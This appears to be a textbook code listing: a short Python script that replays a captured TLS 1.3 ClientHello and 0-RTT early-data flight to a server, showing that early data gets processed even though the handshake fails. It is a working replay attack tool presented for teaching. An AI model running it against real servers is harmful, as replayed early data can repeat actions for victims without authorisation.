# Listing 7.6 — Replay a recorded client flight (ClientHello + 0-RTT records) to the server.
# The attacker never decrypts anything: it re-sends ciphertext it observed on the network.
import socket, sys, time
data = open(sys.argv[1], "rb").read()
host, port = sys.argv[2], int(sys.argv[3])
with socket.create_connection((host, port), timeout=3) as s:
    s.sendall(data)                       # the victim's exact bytes
    try:
        reply = s.recv(65536)             # server answers as if this were a new client
        print(f"server replied with {len(reply)} bytes; handshake will fail at Finished,")
        print("but any early data it accepted has ALREADY been processed.")
    except socket.timeout:
        print("no reply")
